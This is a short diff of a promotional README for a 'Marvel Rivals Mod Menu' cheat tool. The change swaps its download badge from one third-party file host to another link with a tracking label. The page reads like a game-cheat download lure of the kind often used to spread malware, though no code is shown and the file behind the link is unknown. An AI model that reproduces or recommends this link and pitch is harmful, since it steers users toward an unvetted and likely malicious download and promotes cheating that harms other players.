@@ -12,4 +12,5 @@ Marvel Rivals Mod Menu is an advanced tool that unlocks a wide range of cheats a
 
 Marvel Rivals Mod Menu offers all the tools you need to transform your gameplay, giving you an undeniable advantage and allowing you to play without restrictions. Perfect for players who want to experiment with new features and push the limits of the game!
 
-[![Download Rivals ModMenu](https://img.shields.io/badge/Download-Rivals%20ModMenu-blueviolet)](https://downeefiles.com/s/mrvlrvlsmodmenu)
+[![Download Rivals ModMenu](https://img.shields.io/badge/Download-Rivals%20ModMenu-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f
+)
